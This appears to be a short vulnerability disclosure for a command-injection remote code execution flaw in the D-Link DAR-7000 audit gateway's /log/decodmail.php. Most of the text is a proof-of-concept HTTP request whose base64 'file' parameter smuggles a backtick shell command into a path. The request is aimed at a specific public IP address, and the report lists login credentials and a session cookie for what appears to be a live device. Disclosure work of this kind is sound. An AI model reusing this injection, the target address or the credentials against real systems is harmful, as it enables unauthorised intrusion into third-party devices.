
The D-LINK DAR-7000 series online behavior audit gateway has a RCE vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/log/decodmail.php
https://60.22.74.195:8443
<img width="512" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/fca62efa-f811-4c70-b1b8-98ba3109373a">


Account password: test/ admin@123
poc：
```
GET /log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA== HTTP/1.1
Host: 60.22.74.195:8443
Cookie: PHPSESSID=bdb1aa1392da0420192cff3c34e507d6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
<img width="515" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/1624c50c-8650-49d4-ae4b-da1eb77e7028">


